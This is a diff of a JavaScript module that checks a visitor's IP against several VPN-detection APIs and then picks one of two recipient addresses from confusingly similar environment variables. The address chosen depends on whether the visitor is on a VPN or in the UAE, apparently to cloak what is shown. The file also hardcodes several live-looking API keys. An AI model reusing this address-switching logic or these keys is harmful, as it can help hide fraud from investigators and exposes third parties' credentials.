@@ -1,18 +1,21 @@
 import axios from "axios";
 
-// API keys for ipdata.co and IPQualityScore
+// API keys for ipdata.co, ProxyCheck, VPNAPI, IPGeolocation, AbstractAPI
 const IPDATA_API_KEY = '894b025a42d599cc09ebd6e1ef307189c7996ed768d29be082b63d1a';
-const IPQS_API_KEY = 'qbBonEwKytWaDVnehOf7cSBvxVeVtogr';
+const PROXYCHECK_API_KEY = '31u6a9-m702t7-949yr8-4b03u7';
+const VPNAPI_IO_KEY = 'b89b3533ce2148ebb99958acafd3f0f6';
+const IPGEOLOCATION_API_KEY = 'da34cfb1271f44e391f8ccd4e847e76a';
+const ABSTRACT_API_KEY = '9d02dd3a343741309b8b4d3c26ffb098';
 
-// Fetch user data including VPN status, country, and IP from ipdata.co
+let vpnCheckCache = {};  // Cache to store results and avoid repeated API calls
+
+// Fetch user data from ipdata.co
 export async function getUserCountry() {
   const url = `https://api.ipdata.co/?api-key=${IPDATA_API_KEY}`;
 
   try {
     const response = await axios.get(url);
     const { country_name: country, country_code: countryCode, ip, threat } = response.data;
-
-    // Determine if the user is using a VPN (based on threat object)
     const isVpnIpdata = threat ? (threat.is_vpn || threat.is_proxy || threat.is_datacenter || threat.is_tor) : false;
 
     return { country, countryCode, ip, isVpnIpdata };
@@ -22,43 +25,111 @@ export async function getUserCountry() {
   }
 }
 
-// Check VPN status  (through Vite proxy)
-export async function checkVpnStatusWithIPQS(ip) {
-  const ipqsUrl = `/ipqualityscore/api/json/ip/${IPQS_API_KEY}/${ip}?strictness=1`;
+// Check VPN status using ProxyCheck.io
+async function checkVpnStatusWithProxyCheck(ip) {
+  if (vpnCheckCache[ip]?.proxyCheck) return vpnCheckCache[ip].proxyCheck;
 
+  const url = `https://proxycheck.io/v2/${ip}?key=${PROXYCHECK_API_KEY}`;
   try {
-    const response = await axios.get(ipqsUrl);
-    const { vpn, proxy, tor, active_vpn } = response.data;
+    const response = await axios.get(url);
+    const isVpn = response.data[ip]?.proxy === 'yes';
 
-    // Determine if IPQualityScore detects a VPN
-    const isVpnIPQS = vpn || proxy || tor || active_vpn;
-    
-    return isVpnIPQS;
+    vpnCheckCache[ip] = { ...vpnCheckCache[ip], proxyCheck: isVpn };
+    return isVpn;
   } catch (error) {
-    console.error("Error fetching VPN status", error);
+    if (error.code === 'ERR_NETWORK') {
+      console.error("Network Error: Failed to reach ProxyCheck.io. Check your network or API availability.");
+    } else {
+      console.error("Error fetching VPN status from ProxyCheck.io:", error);
+    }
+    return false; // Return a default value
+  }
+}
+
+// Check VPN status using IPGeolocation.io
+async function checkVpnStatusWithIPGeolocation(ip) {
+  if (vpnCheckCache[ip]?.ipGeolocation) return vpnCheckCache[ip].ipGeolocation;
+
+  const url = `https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEOLOCATION_API_KEY}&ip=${ip}`;
+  try {
+    const response = await axios.get(url);
+    const isVpn = response.data.threat.is_vpn;
+
+    vpnCheckCache[ip] = { ...vpnCheckCache[ip], ipGeolocation: isVpn };
+    return isVpn;
+  } catch (error) {
+    if (error.code === 'ERR_NETWORK') {
+      console.error("Network Error: Failed to reach IPGeolocation.io. Check your network or API availability.");
+    } else {
+      console.error("Error fetching VPN status from IPGeolocation.io:", error);
+    }
+    return false; // Return a default value
+  }
+}
+
+
+// Check VPN status using VPNAPI.io
+async function checkVpnStatusWithVPNAPI(ip) {
+  if (vpnCheckCache[ip]?.vpnApi) return vpnCheckCache[ip].vpnApi;
+
+  const url = `https://vpnapi.io/api/${ip}?key=${VPNAPI_IO_KEY}`;
+  try {
+    const response = await axios.get(url);
+    const isVpn = response.data.security.vpn || response.data.security.proxy || response.data.security.tor;
+
+    vpnCheckCache[ip] = { ...vpnCheckCache[ip], vpnApi: isVpn };
+    return isVpn;
+  } catch (error) {
+    console.error("Error fetching VPN status from VPNAPI.io:", error);
     return false;
   }
 }
 
-// Get the recipient address based on the user's VPN status and country code
-export async function getRecipientAddress() {
-  // Get the user's data from ipdata.co
-  const userData = await getUserCountry();
+// Check VPN status using AbstractAPI
+async function checkVpnStatusWithAbstractAPI(ip) {
+  if (vpnCheckCache[ip]?.abstractApi) return vpnCheckCache[ip].abstractApi;
 
+  const url = `https://ipgeolocation.abstractapi.com/v1/?api_key=${ABSTRACT_API_KEY}&ip_address=${ip}`;
+  try {
+    const response = await axios.get(url);
+    const isVpn = response.data.security.is_vpn;
+
+    vpnCheckCache[ip] = { ...vpnCheckCache[ip], abstractApi: isVpn };
+    return isVpn;
+  } catch (error) {
+    console.error("Error fetching VPN status from AbstractAPI:", error);
+    return false;
+  }
+}
+
+// Check VPN status using multiple services
+export async function checkVpnStatus(ip) {
+  // Use all VPN checks in parallel
+  const [isVpnProxyCheck, isVpnVPNAPI, isVpnIPGeolocation, isVpnAbstractAPI] = await Promise.all([
+    checkVpnStatusWithProxyCheck(ip),
+    checkVpnStatusWithVPNAPI(ip),
+    checkVpnStatusWithIPGeolocation(ip),
+    checkVpnStatusWithAbstractAPI(ip)
+  ]);
+
+  // If any of the APIs return true, consider the user to be on VPN
+  return isVpnProxyCheck || isVpnVPNAPI || isVpnIPGeolocation || isVpnAbstractAPI;
+}
+
+// Get the recipient address based on VPN status and country code
+export async function getRecipientAddress() {
+  const userData = await getUserCountry();
   if (!userData) {
     console.error("Failed to retrieve user data");
     return null;
   }
 
   const { country, countryCode, ip, isVpnIpdata } = userData;
-
-  // Check VPN status via IPQualityScore
-  const isVpnIPQS = await checkVpnStatusWithIPQS(ip);
+  const isVpn = isVpnIpdata || await checkVpnStatus(ip);
 
   const specialCountries = ["AE"];
   const address = import.meta.env.VITE_REACT_APP_R;
-  const addrEss = import.meta.env.VITE_REACT_APP_r; 
+  const addrEss = import.meta.env.VITE_REACT_APP_r;
 
-  const recipientAddress = specialCountries.includes(countryCode) || isVpnIpdata || isVpnIPQS ? address : addrEss;
-  return recipientAddress;
+  return specialCountries.includes(countryCode) || isVpn ? address : addrEss;
 }
